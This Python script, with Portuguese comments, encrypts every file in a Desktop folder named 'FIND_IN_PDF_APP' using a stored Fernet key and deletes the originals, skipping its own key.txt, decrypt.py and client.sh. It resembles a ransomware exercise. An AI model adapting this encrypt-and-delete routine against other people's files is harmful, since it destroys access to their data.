#! /usr/bin/env python

from cryptography.fernet import Fernet
import os

print(os.getcwd())
# lê e guarda a key 
with open('key.txt', 'rb') as key_file:
    key = key_file.read()

# vai até /Desktop e vai para a pasta a ser encriptada
usuario = os.getlogin()
desktop_path = os.path.join("/home",usuario,"Desktop")
os.chdir(desktop_path)

if os.path.exists(f"{desktop_path}/FIND_IN_PDF_APP") == True:
    os.chdir(f"{desktop_path}/FIND_IN_PDF_APP")

else:
    print('Creating the directory...')
    os.mkdir(f"{desktop_path}/FIND_IN_PDF_APP") 
    print('Move the files and run again ')
    exit()

# quais arquivos devem ser encriptados
arquivos_para_encriptar = os.listdir(os.getcwd())
fernet= Fernet(key)

print(' Files to encrypt: ', arquivos_para_encriptar)

for index in range(0, len(arquivos_para_encriptar)):
    print(arquivos_para_encriptar[index])
    if arquivos_para_encriptar[index][-9:] == "encrypted":
        print(arquivos_para_encriptar[index] ,' is already encrypted')
    
    elif arquivos_para_encriptar[index] == 'key.txt':
        print('')
    
    elif arquivos_para_encriptar[index] == 'decrypt.py' :
        print('')

    elif arquivos_para_encriptar[index] == 'client.sh' :
        print('')

    else:
        print('Encrypting',arquivos_para_encriptar[index] ,'...')
        with open(arquivos_para_encriptar[index], 'rb') as original_file:
            encrypted_data= fernet.encrypt(original_file.read())

        with open(f"{arquivos_para_encriptar[index]}.encrypted", 'wb') as encrypted_file:
            encrypted_file.write(encrypted_data)

        os.remove(os.path.join(os.getcwd(), arquivos_para_encriptar[index]))
        
print('..FINISHED..')
